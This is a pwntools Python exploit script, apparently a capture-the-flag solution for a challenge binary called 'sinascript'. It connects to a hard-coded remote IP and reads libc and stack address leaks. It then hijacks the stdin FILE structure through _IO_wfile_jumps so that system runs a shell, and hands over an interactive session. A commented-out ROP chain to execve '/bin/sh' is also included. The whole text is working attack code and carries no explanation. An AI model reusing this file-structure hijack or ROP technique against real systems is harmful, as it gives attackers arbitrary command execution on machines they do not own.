from pwn import *
import base64
import sys

context.update(os="linux", arch="amd64")
elf = context.binary = ELF("sinascript")
libc = ELF("libc.so.6")

with open(sys.argv[1], "rb") as f:
	ss_exploit = f.read()

if args.REMOTE:
#	p = remote("127.0.0.1", 5000)
	p = remote("65.109.185.145", 5000)
	p.sendlineafter(b"input: ", base64.b64encode(ss_exploit))
	if args.GDB:
		pause()
else:
	if args.GDB:
		p = gdb.debug(["./sinascript", "exploits/exploit.ss"])
		pause()
	else:
		p = elf.process(["exploits/exploit.ss"])
		# gdb.attach(p)
		# pause()

p.recvuntil(b"libcLeak: ")
libc.address = int(p.recvline())
log.success("libc base = " + hex(libc.address))
p.recvuntil(b"stackLeak: ")
stack_leak = int(p.recvline())
log.success("stack argv strings @ " + hex(stack_leak))

#rop_end = (stack_leak & ~0xf) - 0x2000
#rop_begin = rop_end - 0x800

stdin = libc.sym["_IO_2_1_stdin_"]

fsop = p64(0xfbad208b) + p64(libc.address)
fsop += p64(0) * 5
fsop += p64(stdin) + p64(stdin+0x200)

p.sendafter(b"1234", fsop)

# ropper = ROP(libc)
# ret_gadget = ropper.find_gadget(["ret"]).address
# syscall_gadget = ropper.find_gadget(["syscall"]).address
# pop_rdi = ropper.find_gadget(["pop rdi", "ret"]).address
# pop_rsi = ropper.find_gadget(["pop rsi", "ret"]).address
# pop_rax = ropper.find_gadget(["pop rax", "ret"]).address
# xor_edx = libc.address + 0x16e953	# xor edx, edx ; mov rax, rdx ; ret

# rop1 = p64(pop_rdi) + p64(next(libc.search(b"/bin/sh\0")))
# rop1 += p64(pop_rsi) + p64(0)
# rop1 += p64(xor_edx)
# rop1 += p64(pop_rax) + p64(59)
# rop1 += p64(syscall_gadget)
# while len(rop1) < rop_end - rop_begin:
# 	rop1 = p64(ret_gadget) + rop1

# pause()
# p.sendafter(b"1234", rop1)

fsop2 = b" sh".ljust(8, b"\0") + p64(libc.address)
fsop2 += p64(0) * 3 + p64(1) + p64(0) * 11
fsop2 += p64(stdin + 0x100) + p64(0) * 2
fsop2 += p64(stdin)
fsop2 = fsop2.ljust(0xd0, b"\0")
fsop2 += p64(libc.sym["system"])
fsop2 += p64(libc.sym["_IO_wfile_jumps"])
fsop2 += p64(stdin + 0xd0 - 0x68)

p.sendafter(b"1234", fsop2)

p.interactive()
